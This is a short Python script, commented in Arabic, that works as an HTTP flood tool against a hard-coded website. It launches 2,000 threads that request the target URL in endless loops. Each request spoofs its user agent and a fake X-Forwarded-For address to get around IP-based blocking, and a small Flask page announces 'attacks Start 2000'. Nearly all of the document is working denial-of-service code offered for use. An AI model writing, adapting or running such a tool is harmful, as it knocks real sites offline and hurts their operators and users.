import subprocess
import sys

# قائمة الحزم التي يجب تثبيتها
required_libraries = [
    'flask',
    'aiohttp',
    'beautifulsoup4',
    'faker',
    'fake-useragent'
]

# التحقق من الحزم المثبتة وتثبيت الحزم الغير مثبتة
def install_libraries():
    for library in required_libraries:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", library])
        except subprocess.CalledProcessError:
            print(f"Failed to install {library}")

# استدعاء التثبيت التلقائي
install_libraries()

from flask import Flask
import requests
import threading
from bs4 import BeautifulSoup
from faker import Faker
from fake_useragent import UserAgent

app = Flask(__name__)

fake = Faker()
ua = UserAgent()

def chek(url):
    while True:
        try:
            ip = fake.ipv4()
            headers = {
                "User-Agent": ua.random,
                "X-Forwarded-For": ip  # تعيين عنوان IP الوهمي
            }            
            response = requests.get(url, headers=headers)
            status_code = response.status_code
            soup = BeautifulSoup(response.text, "html.parser")
            title = soup.title.string if soup.title else "No Title"
            print(f"[{status_code}] {title} - {url} - IP: {ip}")
        except requests.exceptions.RequestException:
            print("Request failed")

def start_threads():
    target_url = "https://keysgen.site/exe_right/"
    for _ in range(2000):
        thread = threading.Thread(target=chek, args=(target_url,))
        thread.daemon = True
        thread.start()

@app.route('/')
def home():
    return "attacks Start 2000 "

if __name__ == '__main__':
    threading.Thread(target=start_threads, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
